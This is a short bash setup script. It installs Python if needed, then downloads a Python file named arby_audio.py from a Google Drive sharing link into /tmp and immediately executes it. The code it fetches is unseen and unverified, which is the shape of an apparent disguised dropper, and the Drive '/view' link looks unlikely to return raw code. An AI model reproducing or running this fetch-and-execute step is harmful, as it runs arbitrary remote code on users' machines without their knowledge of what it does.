#!/usr/bin/env bash
set -e

# ------------------------------
# Check for Python
# ------------------------------
if ! command -v python3 &> /dev/null; then
    echo "Python3 not found. Installing..."
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS: Install via Homebrew
        if ! command -v brew &> /dev/null; then
            echo "Homebrew not found. Installing Homebrew first..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
        brew install python
    else
        # Linux: Debian/Ubuntu
        sudo apt update && sudo apt install -y python3 python3-pip
    fi
fi

# Ensure python3 command exists
PYTHON_BIN=python3

# ------------------------------
# Download Python script
# ------------------------------
PY_SCRIPT="/tmp/arby_audio.py"
curl -fsSL "https://drive.google.com/file/d/1b8NnDwAUOh1Oyf3wPedgk6vMt_Iv-t44/view?usp=sharing" -o "$PY_SCRIPT"

# ------------------------------
# Execute Python script
# ------------------------------
"$PYTHON_BIN" "$PY_SCRIPT"
